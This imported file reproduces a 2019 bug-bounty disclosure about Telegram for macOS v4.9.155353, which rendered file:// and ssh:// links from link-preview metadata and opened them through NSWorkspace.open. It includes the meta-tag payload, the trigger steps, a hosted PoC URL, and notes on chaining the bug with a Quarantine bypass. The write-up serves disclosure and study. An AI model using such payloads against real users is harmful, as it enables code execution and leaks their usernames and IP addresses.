---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2019-12-08_telegram-v49155353-was-rendering-file-links-opening-them-via-nsworkspaceopen-cod.md
original_filename: 2019-12-08_telegram-v49155353-was-rendering-file-links-opening-them-via-nsworkspaceopen-cod.md
title: Telegram (v4.9.155353) was rendering file:// links + opening them via NSWorkspace.open
  -> code execution.
category: documents
detected_topics:
- command-injection
- mobile-security
tags:
- imported
- documents
- command-injection
- mobile-security
language: en
raw_sha256: 0a14e498ec99c3e8778a02ff69cd86bb354d51bfc50dbf8591de8bfa04dfe29a
text_sha256: 3e90e9544f91e5f1a95a4bed13091adf904f4990932f67550a3fbb27a9043013
ingested_at: '2026-06-28T07:32:00Z'
sensitivity: unknown
redactions_applied: false
---

# Telegram (v4.9.155353) was rendering file:// links + opening them via NSWorkspace.open -> code execution.

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2019-12-08_telegram-v49155353-was-rendering-file-links-opening-them-via-nsworkspaceopen-cod.md
- Source Type: markdown
- Detected Topics: command-injection, mobile-security
- Ingested At: 2026-06-28T07:32:00Z
- Redactions Applied: False
- Raw SHA256: `0a14e498ec99c3e8778a02ff69cd86bb354d51bfc50dbf8591de8bfa04dfe29a`
- Text SHA256: `3e90e9544f91e5f1a95a4bed13091adf904f4990932f67550a3fbb27a9043013`


## Content

---
title: "Telegram (v4.9.155353) was rendering file:// links + opening them via NSWorkspace.open -> code execution."
page_title: "GitHub - Metnew/telegram-links-nsworkspace-open: Telegram (v4.9.155353) was rendering file:// links + opening them via NSWorkspace.open -> code execution. · GitHub"
url: "https://github.com/Metnew/telegram-links-nsworkspace-open"
final_url: "https://github.com/Metnew/telegram-links-nsworkspace-open"
authors: ["Vladimir Metnew (@vladimir_metnew)"]
programs: ["Telegram"]
bugs: ["RCE"]
bounty: "500"
publication_date: "2019-12-08"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 4901
---

**Summary**

In **Telegram for macOS v4.9.155353** (and below) URL parsing logic in Telegram for macOS platform allows running arbitrary executables and applications URI schemes via links injected into the website's preview.

**PoC**

  1. Send a link to `exploit.html` \- a regular HTML file with `<meta property="og:title" content="file://google.com/bin/sh ssh://google.com/x" />` tag
  2. Website preview renders `file://google.com/bin/sh` and `ssh://google.com/x` as links
  3. Click on the rendered links behaves as `NSWorkspace.open` util -> if points to executable -> code execution.
  4. Click on `ssh://` link -> `Terminal.app` popups with an active ssh session disclosing user's OS username, ip and other details.

**Impact**

The bug could be used...

  * to disclose info about user's machine -> OS username, IP, etc
  * to run arbitrary executables and opening arbitrary files on OS
  * to launch arbitrary applications via URI schemes

This bug could be chained with Quarantine issue to open downloaded quarantine-ignored files and chain this into running of attacker-supplied executable.

**Additional Details**

This bug also exists in iOS, PoC is the same. Impact possibly limited to URI schemes.

PoC URL -> <https://telegram-file-link-1xfcjf27f.now.sh/exploit.html>
